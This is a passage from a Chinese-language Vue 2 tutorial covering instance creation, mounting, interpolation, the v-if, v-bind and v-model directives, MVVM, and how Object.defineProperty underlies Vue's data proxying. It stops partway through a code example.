> Vue 是一个基于 JavaScript（JS）实现的框架

# Vue 初体验

Vue 读音类似 View（视图），Vue 是一个视图框架，用于展示。

## 下载与安装 Vue2

Vue 框架就是一个 js 文件，从 [Vue2官网](https://v2.cn.vuejs.org/) 下载 vue.js 文件：

![image-20240419194034669](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404191940744.png)

在 Vue2 的主页中，注意 学习 中的 教程 和 API 两个菜单，学习 Vue 需要用到。

点击主页中的 起步，会跳转到 教程 界面中去，点击 安装 菜单：

![image-20240419194156224](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404191941298.png)

+ Vue Devtools：一个浏览器插件，开发者工具，更方便调试 Vue 程序
+ 开发版本：vue.js，体积更大
+ 生产版本：vue.min.js，体积更小

下载好了之后，安装 Vue 就是通过 `<script>` 标签将 vue.js 文件引入即可：

```html
<script src="../js/vue.js"></script>
```

+ 当使用 script 进行 Vue 安装之后，上下文中就注册了一个全局变量：Vue（相当于引入 jQuery 后多了一个 `$` 全局变量）

运行这个引入了 vue.js 的 html 页面后，这个 Vue 全局变量可以在浏览器中控制台中查看：

![image-20240419194542180](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404191945210.png)

## 第一个vue程序

```html
<div id="app"></div>
<script>
    var myVue = new Vue({
        template: '<h1>hello world</h1>'
    });
    myVue.$mount('#app');
</script>
```

运行结果：

![image-20240419194735706](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404191947731.png)

代码解释：

第一步：**创建Vue实例**

**1、为什么要new Vue()，直接调用Vue()函数不行吗？**

不行，因为直接调用 Vue() 函数，不创建实例的话，会出现以下错误：

```html
vue.js:5129 [Vue warn]: Vue is a constructor and should be called with the `new` keyword
```

![image-20240419194941349](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404191949383.png)

可以看出，Vue 这个全局变量是一个构造方法，需要一个参数 options。

**2、关于Vue构造函数的参数：options？**

Vue 框架要求这个 options 参数必须是一个纯粹的 JS 对象：`{}`，在 `{}` 对象中可以编写大量的 `key:value` 对。

一个 `key:value` 对就是一个配置项。

通过 options 这个参数来给 Vue 实例指定多个配置项。

**3、关于template配置项？**

 template 翻译为：模板。template 配置项用来指定**模板语句**，模板语句是一个字符串形式的。

**4、什么是模板语句？**

Vue 的模板语句是 Vue 框架自己搞的一套语法规则。Vue 框架自己制定了一些具有特殊含义的特殊符号。

模板语句可以是一个纯粹的 HTML 代码，也可以是 Vue 中的特殊规则。也可以是 HTML 代码 + Vue 的特殊规则。

运行时，template 后面的模板语句会被 Vue 框架的编译器进行编译，转换成浏览器能够识别的 HTML 代码。

第二步：**挂载**

**1、Vue实例都有一个$mount()方法，这个方法的作用是什么？**

将 Vue 实例挂载到指定位置。`myVue.$mount('#app')` 就是将 myVue 这个实例挂载到 id 为 app 的元素上。这里的 `#app` 是一个 id 选择器，和 css 中的选择器一样的写法，也可以使用以下写法：

```js
myVue.$mount(document.getElementById('app'));
```

**2、为什么要挂载？**

Vue 实例创建出来时，是在内存中漂泊，如果想展示该 Vue 实例，需要将实例挂载到页面中的某个位置，才能显示出该实例。

这就是指定一个挂载位置：

```html
<div id="app"></div>
```

然后挂载：

```js
myVue.$mount('#app');
```

## 模板语句的数据来源

模板语句的数据来源是另一个配置项 `data`，专业叫法：Vue 实例的数据对象（data实际上是给整个Vue实例提供数据来源的。）

```html
<div id="app"></div>
<script>
    var myVue = new Vue({
        template: '<h1>姓名：{{name}}，年龄：{{age}}</h1>',
        data: {
            name: "zsm",
            age: 18
        }
    });
    myVue.$mount('#app');
</script>
```

**1、data选项的类型是什么？**

data 配置项的值是一个 `Obejct` （对象）或者 `function`（函数）。

如果 data 是对象的话，对象必须是纯粹的对象 (含有零个或多个的 key/value 对)。

**2、data数据如何插入到模板语句当中？**

template 指定的模板语句是可以动态显示数据的，就是将 data 中的值通过特定的语法写在 template 中，然后显示在页面上。

`{{}}` 这是 Vue 框架自己搞的一套语法，别的框架看不懂的，浏览器也是不能够识别的。这种语法在 Vue 框架中被称为：模板语法中的**插值语法**。（有的人把他叫做胡子语法。）

**3、怎么使用插值语法？**

`{{ }}` 中间写的是 data 中对象的 key。

细节：`{{` 和 `}}` 中间不能有空格或其他字符，例如不能这样：`{  {name}}、{{name}  }、{aaa{name}da}`

**4、data的值**

data 配置项的值的类型不是固定的，可以是任意的合法的 js 的类型：

```js
new Vue({
    // 这里换行可以使用 + 号连接字符串，也可以直接使用飘号 ``
    template : `<h1>最近非常火爆的电视剧{{name}}，它的上映日期是{{releaseTime}}。主角是{{lead.name}}，年龄是{{lead.age}}岁。
                其他演员包括：{{actors[0].name}}({{actors[0].age}}岁)，{{actors[1].name}}({{actors[1].age}}岁)。{{a.b.c.d.e.name}}
                </h1>`,
    data : {
        name : '狂飙!!!',
        releaseTime : '2023年1月2日',
        lead : {
            name : '高启强',
            age : 41
        },
        actors : [
            {
                name : '安欣',
                age : 41
            },
            {
                name : '高启兰',
                age : 29
            }
        ],
        a : {
            b : {
                c : {
                    d : {
                        e : {
                            name : '呵呵'
                        }
                    }
                }
            }
        }
    }
}).$mount('#app')
```

以上程序执行原理：Vue 编译器对 template 进行编译，遇到胡子 `{{}}` 时从 data 中取数据，然后将取到的数据插到对应的位置。生成一段 HTML 代码，最终将 HTML 渲染到挂载位置，呈现。

**当 data 发生改变时，template 模板会被重新编译，重新渲染。**

## template详解

**1、template中只能有一个根节点**

template 后面指定的是模板语句，但是模板语句中只能有一个根节点。比如，下面的写法会报错：

```js
var myVue = new Vue({
    template: '<h1>hello world</h1><h1>zzzzssm</h1>'
});
myVue.$mount('#app');
```

![image-20240419201540534](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404192015582.png)

所以可以将模板语句这样写：

```js
var myVue = new Vue({
    template: '<div><h1>hello world</h1><h1>zzzzssm</h1></div>'
});
myVue.$mount('#app');
```

**2、只要data中的数据发生变化，模板语句一定会重新编译**

**3、如果使用template配置项的话，指定挂载位置的元素会被替换**

假如指定的挂载位置是：

```html
<div id="app">1234</div>
```

那么挂载后，该 `div` 中的内容都会被替换掉，该 `div` 的作用就是起一个占位符的作用。

**4、template可以直接写在html中**

目前我们可以不使用 template 来编写模板语句。这些模板语句可以直接写到 html 标签中。Vue 框架能够找到并编译，然后渲染。

比如：

```html
<div id="app">
    <div>
        <h1>{{msg}}</h1>
        <h1>{{name}}</h1>
    </div>
</div>
```

这样就不需要使用 template 配置项了，只要提供了 data 数据即可，Vue 框架能够找到并编译，然后渲染。

如果像这样直接将模板语句编写到 HTML 标签中，指定的挂载位置就不会被替换了。

**5、使用el自动挂载**

使用 `el` 配置项，可以达到 `$mount()` 同样的效果。就是告诉 Vue 实例去接管哪个容器：

```js
new Vue({
    data : {
        msg : 'Hello Vue!!!!!!!',
        name : 'ssss!!!!!!'
    },
    el : '#app'
    //el : document.getElementById('app')
})
```

`el : '#app'` 就表示让 Vue 实例去接管 id 为 app 的容器，将实例挂载到这个元素上。

el 其实是 element 的缩写，被翻译为元素。

## 解决控制台上的提示信息

![image-20240419202911013](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404192029067.png)

第一条提示：

```
下载 Vue Devtools 扩展以获得更好的开发体验：
https://github.com/vuejs/vue-devtools
```

+ 安装了 Vue Devtools 插件后就不会有该提示了

第二条提示：生产提示信息

```
您正在开发模式下运行 Vue。
确保在部署生产时打开生产模式。
```

+ 因为该 html 文件引入的是开发模式的 vue.js，如果是生产环境下，建议引入 vue.min.js。

+ 引入了 vue.min.js 后，vue 框架就会认为进入了生产环境，就不会再有该提示。

+ 手动去掉该提示：

  + 打开 Vue2 的官方 API 文档，找到 “全局配置”，`Vue.config` 对象

    ![image-20240419203534608](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404192035708.png)

  + 修改 Vue.config 对象中的 productionTip 属性为 false，即可关闭该提示信息：

    ![image-20240419203649837](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404192036898.png)

    ```js
    Vue.config.productionTip = false
    ```

  + 该方法可能不会起效，可能和浏览器等有关。那么如何彻底解决？在 vue.js 源码中搜索到 productionTip 这个属性，将值改为 false。

## Vue开发者工具

安装了 Vue Devtools 后，在浏览器的开发者工具中就会有一个 vue 面板：

![image-20240420083637855](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200836906.png)

+ 左侧第一栏：显示 app
+ 第二栏：显示 app 下的组件，每个 app 下可有多个组件，root 是根组件
+ 第三栏：显示组件下的数据，可以更改，改了后，页面会重新渲染

小问题：data 中的数据如果全部以中文字符开头，可能会出现 vue devtools 工具不能正常显示的问题：

```js
data : {
    msg : '的Hello Vue!!!!!!!',
    name : '顶顶顶顶顶!!!!!!'
},
```

![image-20240420084114800](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200841862.png)

这样的情况下，跟组件选择不了，如果 data 中有一个数据不是以中文开头的就可以：

![image-20240420084211817](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200842878.png)

## Vue实例和容器

Vue实例 和 容器 的关系是：一夫一妻制。

一个 Vue 实例只能接管一个容器；一个容器只能被一个 Vue 实例接管。

比如，一个 Vue 实例接管相同类名的两个容器：

```html
<!-- 准备容器 -->
<div class="app">
    <h1>{{msg}}</h1>
</div>

<div class="app">	
    <h1>{{msg}}</h1>
</div>
<script>
    new Vue({
        el : '.app',
        data : {
            msg : 'Hello Vue!'
        }
    })
</script>
```

![image-20240420084710422](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200847744.png)

可以看到，这个 Vue 实例只接管了第一个类名为 app 的容器。一旦接管到容器之后，即使后面有相同的容器，Vue 也是不管的。

再比如：一个容器被两个 Vue 实例接管：

```html
<!-- 准备容器 -->
<div id="app2">
    <h1>{{name}}</h1>
</div>
<script>
    new Vue({
        el : '#app2',
        data : {
            name : 'zhangsan'
        }
    })
    new Vue({
        el : '#app2',
        data : {
            name : 'jackson'
        }
    })
</script>
```

![image-20240420085250544](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200852614.png)

+ 此时页面上显示的是第一个 Vue 实例的数据，但是开发者工具中却只有第二个 Vue 实例，说明第一个 Vue 实例被覆盖掉了，但是数据已经渲染了（猜的）

---

# Vue 核心技术

## 模板语法

### 插值语法

模板语法中的插值语法 `{{ }}`。

在 `{{ }}` 可以写四种东西。

使用插值语法时，Vue.js 会自动将组件实例的数据绑定到模板上下文中，所以在插值语法中，不需要写 this.：

```vue
<h1>{{this.msg}}</h1>
```

但是这样写也不会有错，因为这个 this 还是表示的该模板绑定的实例。插值语法中一般不写 this。

**1、在data中声明的变量、函数等**

可以将在 data 中声明的键值对看成是一个变量，key 是变量名，value 是变量值：

```html
<!-- 准备容器 -->
<div id="app">
    <!-- 在data中声明的 -->
    <!-- 这里就可以看做在使用msg变量。 -->
    <h1>{{msg}}</h1>
    <h1>{{sayHello()}}</h1>
</div>

<script>
new Vue({
    el : '#app',
    data : {
        msg : 'abcdef',  // 把msg叫做变量。（这行代码就可以看做是变量的声明。）
        sayHello : function(){
            console.log('hello vue!');
        }
    }
})
</script>
```

注意：不在 data 中定义的变量或函数无法使用，比如这个 i ：

```html
<div id="app">
    <h1>{{msg}}</h1>
    <h1>{{sayHello()}}</h1>
    <h1>{{i}}</h1>
</div>

<script>
    var i = 1;
    new Vue({
        el : '#app',
        data : {
            msg : 'abcdef',  
            sayHello : function(){
                console.log('hello vue!');
            }
        }
    })
</script>
```

会报错：

![image-20240420090307583](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200903655.png)

**2、常量**

该常量指固定不变的字面量、字面值。比如 `var i = 10;` 中等号左边的是变量，右边的是常量。

```html
<h1>{{100}}</h1>
<h1>{{'hello vue!'}}</h1>
<h1>{{3.14}}</h1>
```

以上写法是可以的：

![image-20240420090720441](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200907519.png)

但是这个常量不能是代码中通过 `const` 关键字定义的常量：

```html
<h1>{{a}}</h1>

<script>
	const a = 'aaa';
</script>
```

![image-20240420090815810](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200908881.png)

**3、合法的javascript表达式**

```html
<h1>{{1 + 1}}</h1>
<h1>{{'hello' + 'vue'}}</h1>
<h1>{{msg + 1}}</h1>
<h1>{{'msg' + 1}}</h1>
<h1>{{gender ? '男' : '女'}}</h1>
<h1>{{number + 1}}</h1>
<h1>{{'number' + 1}}</h1>
<h1>{{msg.split('').reverse().join('')}}</h1>

<script>
	new Vue({
        el : '#app',
        data : {
            number : 1,
            gender : true,
            msg : 'abcdef',  
            sayHello : function(){
                console.log('hello vue!');
            }
        }
    })
</script>
```

注意：在 `{{ }}` 中写 js 语句是不会生效的，比如：

```html
<h1>{{ var a = 1 }}</h1>
<h1>{{ if (ok) { return message } }}</h1>
```

**4、白名单变量**

模板表达式都被放在沙盒中，只能访问[全局变量的一个白名单](https://github.com/vuejs/vue/blob/v2.6.10/src/core/instance/proxy.js#L9)，如 `Math` 和 `Date` 等。链接跳转到的地方是：

![image-20240420091643201](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200916278.png)

说明以下这些都是白名单中的内容：

```html
'Infinity,undefined,NaN,isFinite,isNaN,'
'parseFloat,parseInt,decodeURI,decodeURIComponent,encodeURI,encodeURIComponent,'
'Math,Number,Date,Array,Object,Boolean,String,RegExp,Map,Set,JSON,Intl,'
'require'
```

那么就可以直接使用：

```html
<h1>{{Date}}</h1>
<h1>{{Date.now()}}</h1>
<h1>{{Math}}</h1>
<h1>{{Math.ceil(3.14)}}</h1>
```

![image-20240420091832326](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200918416.png)

### 指令语法

**1、什么是指令？有什么作用？**

指令的职责是，当表达式的值改变时，将其产生的连带影响，响应式地作用于 DOM。

**2、Vue 框架中的所有指令的名字都以 “v-” 开始**

比如 `v-if` 。

**3、指令写在哪里呢？**

插值 `{{ }}` 是写在标签体当中的，指令 `v-` 是写在标签上的，以属性的形式存在：

```html
<span 指令是写在这里的>{{这里是插值语法的位置}}</span>
```

注意：虽然指令是写在标签的属性位置上，但是这个指令浏览器是无法直接看懂的。是需要先让 Vue 框架进行编译的，编译之后的内容浏览器是可以看懂的。

**4、指令语法**

指令的一个完整的语法格式：

```html
<HTML标签 v-指令名:参数="javascript表达式"></HTML标签>
```

+ `v-指令名:参数="javascript表达式"` 这一串就是一个完整的指令写法
+ 参数是属于指令的参数，参数不是必须的，有的指令不需要参数
+ 表达式：之前在插值语法中 `{{这里可以写什么}}`，那么指令中的表达式就可以写什么。实际上是一样的。但是需要注意的是：**在指令中的表达式位置不能外层再添加一个 `{{ }}`**

不是所有的指令都有参数和表达式。

+ 有的指令，不需要参数，也不需要表达式，例如：`v-once`
+ 有的指令，不需要参数，但是需要表达式，例如：`v-if="表达式"`
+ 有的指令，既需要参数，又需要表达式，例如：`v-bind:参数="表达式"`

#### v-once

作用：只渲染元素一次。随后的重新渲染，元素及其所有的子节点将被视为静态内容并跳过。这可以用于优化更新性能。

```html
<h1>{{msg}}</h1>
<h1 v-once>{{msg}}</h1>
```

当 data 中的 msg 发生了改变后，以上两个 `h1` 标签只会更新第一个，因为第二个使用了 `v-once` 指令，只会熏染一次，相当于变成了一个静态的元素，只有重新刷新页面才会重新渲染。

#### v-if="表达式"

表达式的执行结果需要是一个布尔类型的数据：true 或者 false

+ true：这个指令所在的标签，会被渲染到浏览器当中。
+ false：这个指令所在的标签，不会被渲染到浏览器当中。

```html
<div id="app">
    <h1 v-if="a > b">v-if测试：{{msg}}</h1>
</div>
<script>
    new Vue({
        el : '#app',
        data : {
            msg : 'Hello Vue!qqqq',
            a : 10,
            b : 11
        }
    })
</script>
```

注意：v-if=false 时，并不是将元素隐藏了，而是根本没有渲染，在开发者工具中找不到该元素。

#### v-bind

**1、这个指令是干啥的？**

它是一个负责动态绑定的指令，它可以让HTML标签的某个属性的值产生动态的效果。

**2、语法格式**

```html
<HTML标签 v-bind:参数="表达式"></HTML标签>
```

**3、v-bind指令的编译原理？**

编译前：

```html
<HTML标签 v-bind:参数="表达式"></HTML标签>
```

编译后：将参数名转换为标签的属性名，表达式的执行结果转换为属性的值

```	html
<HTML标签 参数="表达式的执行结果"></HTML标签>
```

比如：

```html
<div id="app">
    <img v-bind:src="path" >
</div>

<script>
	new Vue({
        el: "#app",
        data: {
            path: "pppppp"
        }
    })
</script>
```

此时这个图片标签的 src 属性就是 data 中定义的 path 变量，是一个变量的值了，不再是一个写死的路径。

而在页面上，这个元素是被转换成这样的：

![image-20240420095152765](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404200951859.png)

如果是这样写：

```html
<img v-bind:src="'path'" >
```

那么这个 'path' 就是一个常量，最终的 html 标签是这样：

![image-20240420100205021](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201002116.png)

注意两项：

+ 第一：在编译的时候 v-bind 后面的“参数名”会被编译为 HTML 标签的“属性名”
  + 这个参数名可以随便写，但是还是需要写成该HTML标签支持的属性名。这样才会有意义
+ 第二：表达式会关联 data，当 data 发生改变之后，表达式的执行结果就会发生变化。
+ 所以，连带的就会产生动态效果。

**4、简写方式**

v-bind 因为很常用，所以 Vue 框架对该指令提供了一种简写方式，比如：

```html
<img :src="imgPath">
```

**5、应用示例**

动态绑定文本输入框的值：

```html
<div id="app">
    <!-- 这是一个普通的文本框 -->
    <input type="text" name="username" value="zhangsan"> <br>
    <!-- 以下文本框可以让value这个数据变成动态的：这个就是典型的动态数据绑定。 -->
    <input type="text" name="username" :value="username"> <br>
</div>

<script>
	new Vue({
        el : '#app',
        data : {    
            username : 'jackson',
        }
    })
</script>
```

动态绑定超链接的地址：

```html
<div id="app">
   <!-- 使用v-bind也可以让超链接的地址动态 -->
    <a href="https://www.baidu.com">走起</a> <br>
    <a :href="url">走起2</a> <br>
</div>

<script>
	new Vue({
        el : '#app',
        data : {    
            url : 'https://www.baidu.com',
        }
    })
</script>
```

不能有这种写法：

```html
<div id="app">
    <a href="{{url}}">走起</a> <br>
</div>
```

会报错：

![image-20240420104817148](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201049670.png)

属性内部插值这种语法已经被移除了。（可能Vue在以前的版本中是支持这种写法的，但是现在不允许了。）

请使用v-bind或冒号速记来代替。

请使用 `<div :id="val">` 来代替 `<div id="{{ val }}">`。

**5、什么时候使用插值语法？什么时候使用指令？**

凡是标签体当中的内容要想动态，需要使用插值语法。

只要想让HTML标签的属性动态，需要使用指令语法。

#### v-model

`v-model` 和 `v-bind` 差不多，可以完成数据的绑定。

**1、v-bind和v-model的区别和联系**

`v-bind` 是单向数据绑定。data \=\=\=> 视图；`v-model` 是双向数据绑定。data <\=\=\=> 视图

```html
<div id="app">
    v-bind指令：<input type="text" v-bind:value="name1"><br>
    v-model指令：<input type="text" v-model:value="name2"><br>
</div>

<script>
    new Vue({
        el : '#app',
        data : {
            name1 : 'zhangsan',
            name2 : 'wangwu',
        }
    })
</script>
```

![image-20240420110105548](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201101672.png)

+ 单向数据绑定：修改了 data 后，视图中的显示会变化。
+ 双向数据绑定：修改了 data 后，视图中的显示会变化；修改了视图中的数据后，datat 中的数据也会变化。
+ 比如，将 data 中的 name1 和 name2 都修改了的话，页面上输入框的值也会发生变化；但是将第一个文本框中的数据修改后，data 中的 name1 不会发生变化；将第二个输入框中的数据修改后，data 中的 name2 也会被修改。

`v-bind` 可以使用在任何 HTML 标签当中。`v-model` 只能使用在表单类元素上。例如：input 标签、select 标签、textarea 标签。

+ 因为表单类的元素才能给用户提供交互输入的界面。元素的值才会发生改变，才有双向绑定的意义。

+ 如果使用在非表单元素上会报错：

  ```html
   <a v-model:href="url">百度</a>
  ```

  ![image-20240420110745524](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201107666.png)

`v-model` 指令通常也是用在 value 属性上面的。

`v-bind` 和 `v-model` 都有简写方式：

+ `v-bind:参数="表达式" `  简写为   ` :参数="表达式"`
+ `v-model:value="表达式"`  简写为   `v-model="表达式"`

```html
消息1：<input type="text" :value="msg"><br>
消息2：<input type="text" v-model="msg"><br>
```

## MVVM分层思想

![MVVM分层思想-Vue框架的实现](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201114655.png)

**1、MVVM是什么？**

M：Model（模型/数据）

V：View（视图）

VM：ViewModel（视图模型）：VM 是 MVVM 中的核心部分。（它起到一个核心的非常重要的作用。）

MVVM 是目前前端开发领域当中非常流行的开发思想。(一种架构模式。)。目前前端的大部分主流框架都实现了这个 MVVM 思想，例如 Vue，React 等。

**2、Vue框架遵循MVVM吗？**

虽然没有完全遵循 MVVM 模型，但是 Vue 的设计也受到了它的启发。Vue 框架基本上也是符合 MVVM 思想的。

**3、MVVM模型当中倡导了Model和View进行了分离，为什么要分离？**

假如 Model 和 View 不分离，使用最原始的原生的 javascript 代码写项目：如果数据发生任意的改动，接下来我们需要编写大篇幅的操作 DOM 元素的 JS 代码。

将 Model 和 View 分离之后，出现了一个 VM 核心，这个 VM 把所有的脏活累活给做了，也就是说，当 Model 发生改变之后，VM 自动去更新 View。当 View 发生改动之后，VM 自动去更新 Model。我们再也不需要编写操作DOM 的 JS 代码了。开发效率提高了很多。

```html
<!-- View V-->
<div id="app">
    姓名：<input type="text" v-model="name">
</div>

<script>
    // ViewModel  VM
    new Vue({
        el : '#app',
        // Model  M
        data : {
            name : 'zhangsan'
        }
    })
</script>
```

![image-20240420112204459](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201122583.png)

因此，一般会用 vm 表示 Vue 实例：

```js
// ViewModel  VM
const vm = new Vue({
    el : '#app',
    // Model  M
    data : {
        name : 'zhangsan'
    }
})
```

## vscode生成代码片段

像上面创建一个 Vue 实例的代码片段一般是固定的，没必要每次都去手写，可以使用 vscode 自动生成。

在 vscode 左下角，点开齿轮图标，选择用户代码片段（User Snippets），

![image-20240420112733580](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201127698.png)

会弹出搜索框，直接搜索 JavaScript，

![image-20240420112757454](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201127565.png)

回车，会打开一个 json 文件：

![image-20240420112837498](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201128625.png)

在这个文件当中就可以配置代码片段，比如默认中的一个例子：

```json
"Print to console": {
    "prefix": "log",
    "body": [
        "console.log('$1');",
        "$2"
    ],
    "description": "Log output to console"
},
```

+ "Print to console"：这是提示信息
+ "prefix"：前缀，或者说简写。只要敲完这个简写指定的字符 log，就会出现 "Print to console" 这个提示信息，回车之后就会生成 "body" 中指定的代码模板。
+ "body"：配置代码片段。
  + body 中的部分是一个数组，数组之间的元素使用逗号隔开。一般情况下，一个元素就是一行代码
  + body 中的 `$1` 和 `$2` 是用来做光标定位的，`$1` 表示生成这个代码片段后，输入光标会被定位在哪里；`$2` 是当光标在 `$1` 位置时，按下 tab 键后，光标所在的位置。
+ "description"：描述信息，可以删除不要。

所以此时在 vscode 中输入 log：

![image-20240420113332773](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201133893.png)

所以可以给生成 Vue 实例的代码片段配置一下：

```json
"create vue instance": {
    "prefix": "cvm",
    "body": [
        "const vm = new Vue({",
        "    el: '$1',",
        "    data: {",
        "		$2",
        "    }",
        "})"
    ]
},
```

此时输入 cvm：

![image-20240420113918731](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201139856.png)

还可以安装一个插件：JavaScript (ES6) code snippets，自带了很多的常用代码片段

![image-20240420114024075](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201140208.png)

比如生成箭头函数：anfn

![image-20240420114112276](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404201141394.png)

## 认识vm

在 Vue 中，MVVM 分层中的 vm 就是 Vue 实例。通过 Vue 实例都可以访问哪些属性？

Vue 实例中的属性很多，有的以 `$` 开始，有的以 `_` 开始。

+ 所有以 `$` 开始的属性，可以看做是公开的属性，这些属性是供程序员使用的。
+ 所有以 `_` 开始的属性，可以看做是私有的属性，这些属性是 Vue 框架底层使用的。一般我们程序员很少使用。

在代码中创建一个 Vue 实例，然后在浏览器的控制台中输出：

```js
const vm = new Vue({
    el : '#app',
    data : {
        msg: "hello"
    }
})
```

![image-20240421084846607](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210849137.png)

这些都是 Vue 实例 vm 中的属性，都可以通过 `vm.` 访问到。通过 vm 也可以访问 Vue 实例对象的原型对象 Prototype 上的属性 。

还有在 data 中定义的 msg 属性，也可以直接使用 vm 访问：

```js
console.log(vm.msg);
```

**有个疑问**：在上图中可以看到 vm 中有个 msg 属性，但是 msg 属性是 data 对象里面的，为什么 vm 中会有？而且在图中显示的是`msg:(...)` ，只有点击了这三个点才能看到 msg 的值，为什么 msg 属性可以通过 vm 来访问呢？

这是因为 Vue 框架底层使用了数据代理机制。要想搞明白数据代理机制，必须有一个基础知识点要学会：Object.defineProperty()。

## Object.defineProperty()

这个方法是 ES5 新增的。

这个方法的作用是：**给对象新增属性，或者设置对象原有的属性。**

使用格式：

```js
Object.defineProperty(给哪个对象新增属性, '新增的这个属性名叫啥', {给新增的属性设置相关的配置项key:value对})
```

第三个参数是属性相关的配置项，配置项都有哪些？每个配置项的作用是啥？

+ value 配置项：给属性指定值
+ writable 配置项：设置该属性的值是否可以被修改。true 表示可以修改。false 表示不能修改。
+ getter方法 配置项：不需要我们手动调用的。当读取属性值的时候，getter 方法被自动调用。
  + getter 方法的返回值非常重要，这个返回值就代表这个属性它的值。
+ setter方法 配置项：不需要我们手动调用的。当修改属性值的时候，setter 方法被自动调用。
  + setter 方法上是有一个参数的，这个参数可以接收传过来的值。
+ **注意：当配置项当中有 setter 和 getter 的时候，value 和 writable 配置项都不能存在。**

比如现在有个对象 phone，给他新增一个 color 属性：

```js
// 这是一个普通的对象
let phone = {}

// 给上面的phone对象新增一个color属性
Object.defineProperty(phone, 'color', {
    value: '太空灰'
}
```

然后可以访问到这个 color 属性：

![image-20240421090515399](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210905462.png)

此时在控制台中修改 color 属性的值，发现不会修改成功：

![image-20240421090604457](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210906517.png)

因为还有一个配置项 writable 设置该属性是否可以被修改，设为 true 时就说明可以被修改：

```js
// 这是一个普通的对象
let phone = {}

// 给上面的phone对象新增一个color属性
Object.defineProperty(phone, 'color', {
    value: '太空灰',
    writable: true,
}
```

![image-20240421090805978](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210908042.png)

还有 getter 和 setter 方法配置项，这两个方法自动调用，不需要手动调用

+ 在读取属性值时调用 getter
+ 在修改属性值时调用 setter

getter setter 和 value writable 不能同时存在，也就是不能这么写：

```js
Object.defineProperty(phone, 'color', {
    value : '太空灰',
    writable : true,
    // getter方法配置项
    get: function () {
       
    },
    // setter方法配置项
    set: function () {
       
    }
})
```

会报错：

![image-20240421091131590](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210911654.png)

将 value 和 writable 注释掉后，就可以了：

```js
Object.defineProperty(phone, 'color', {
    get: function () {
        console.log('getter方法执行了@@@');
    },
    set: function () {
        console.log('setter方法执行了@@@');
    }
})
```

此时访问和修改 phone.color：

![image-20240421091753612](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210917682.png)

set 方法应该是有参数的，可以测试一下：

```js
Object.defineProperty(phone, 'color', {
    get: function () {
        console.log('getter方法执行了@@@');
    },
    set: function (a, b, c, d) {
        console.log('setter方法执行了@@@', a, b, c, d);
    }
})
```

![image-20240421091903603](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210919670.png)

显然，给属性赋值的时候，值就是第一个参数。所以 setter 方法的参数一般叫做 val：

```js
Object.defineProperty(phone, 'color', {
    get: function () {
        
    },
    set: function (val) {
        
    }
})
```

但是此时访问属性的时候，拿到的值是 undefined，这是因为 get 方法并没有返回值，所以需要给 get 方法设置返回值，返回该属性的值。

注意，不能这样写，这样会产生递归：

```js
Object.defineProperty(phone, 'color', {
    get: function () {
        console.log('getter方法执行了@@@');
        return this.color;
    },
    set: function (val) {
        console.log('setter方法执行了@@@', val);
        this.color = a;
    }
})
```

此时当访问 phone.color 时，会调用 get 方法，get 方法中的 this.color 又会访问 get 方法，最终就会一直递归：

![image-20240421092423013](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210924108.png)

修改 phone.color 时也会递归，也是一直调用 get 方法。

为了避免这种情况，需要使用一个临时变量：

```js
let temp;
Object.defineProperty(phone, 'color', {
    get: function () {
        console.log('getter方法执行了@@@');
        return temp;
    },
    set: function (val) {
        console.log('setter方法执行了@@@', val);
        temp = val;
    }
})
```

![image-20240421092824186](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210928273.png)

## 数据代理机制

### 原理

**1、什么是数据代理机制？**

通过访问 代理对象的属性 来间接访问 目标对象的属性。

数据代理机制的实现需要依靠：Object.defineProperty() 方法。

此时我有两个对象：

```js
// 目标对象
let target = {
    name : 'zhangsan'
}

// 代理对象
let proxy = {}
```

如果要实现数据代理机制的话，也就是说我要使用代理对象 proxy 的属性去访问目标对象 target 的 name 属性的话，就需要给 proxy 新增一个 name 属性。

+ 注意：代理对象新增的这个属性的名字 和 目标对象的属性名要一致。
+ 因为：为了达到这种效果：访问代理对象的属性时，就像在访问目标对象的属性

```js
Object.defineProperty(proxy, 'name', {
    get : function(){
        // 间接访问目标对象的属性
        return target.name;
    },
    set : function(val){
        target.name = val;
    }
})
```

此时，访问和修改 proxy 对象的 name 属性时，都是操作的 target 对象的 name 属性：

![image-20240421093642485](https://gitee.com/LowProfile666/image-bed/raw/master/img/202404210936565.png)

那么此时，就能理解为什么 Vue 实例 vm 中会有 msg 属性，就相当于：

```js
let target = {
    msg : 'hello world'
}

const vm = new Vue({
